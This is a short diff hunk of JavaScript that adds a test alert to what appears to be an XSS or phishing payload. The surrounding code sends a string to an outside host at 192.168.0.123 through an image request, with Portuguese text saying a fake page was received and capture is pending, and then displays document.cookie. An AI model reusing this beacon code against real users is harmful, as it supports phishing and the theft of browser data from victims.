@@ -14,6 +14,8 @@ var busca = "%20";
 var strbusca = eval('/'+busca+'/g');
 str2 = str.replace(strbusca, "_");
 
+alert('teste');
+
 new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_aguarde_captura....";
 
 alert(document.cookie);
